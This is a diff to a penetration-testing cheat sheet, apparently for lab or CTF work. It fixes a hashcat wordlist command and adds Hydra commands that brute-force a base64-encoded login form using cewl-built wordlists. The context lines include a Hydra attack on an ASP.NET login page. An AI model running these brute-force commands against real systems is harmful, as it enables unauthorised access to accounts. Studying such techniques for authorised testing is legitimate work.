@@ -69,9 +69,10 @@ Look at the cookies.. if there's a cookie name that you don't know, it could be 
 7. Potentially brute forcing admin/login panel with Burp Intruder
 
 8. Create a wordlist from the webpage using cewl:
+
 ```bash
 cewl http://example.com -d 4 -m 5 -w cewl.txt
-hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt cewl-best64.txt
+hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt > cewl-best64.txt
 ```
 
 9. Run droopescan
@@ -430,6 +431,22 @@ hydra -l user -P pwdpath ip http-get
 
 ```bash
 hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+```
+
+#### Hydra for Base64 encoded login
+
+```bash
+cewl http://$ip:8081/ -d 8| grep -v CeWL >> custom-wordlist.txt
+cewl --lowercase http://$ip:8081/ -d 8| grep -v CeWL  >> custom-wordlist.txt
+# -I : ignore any restore files
+# -f : stop when a login is found
+# -L : username list
+# -P : password list
+# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values
+# C=/ tells hydra to establish session cookies at this URL
+# F=403 tells hydra that HTTP 403 means invalid login
+hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 ```
 
 #### Finding Root Directory
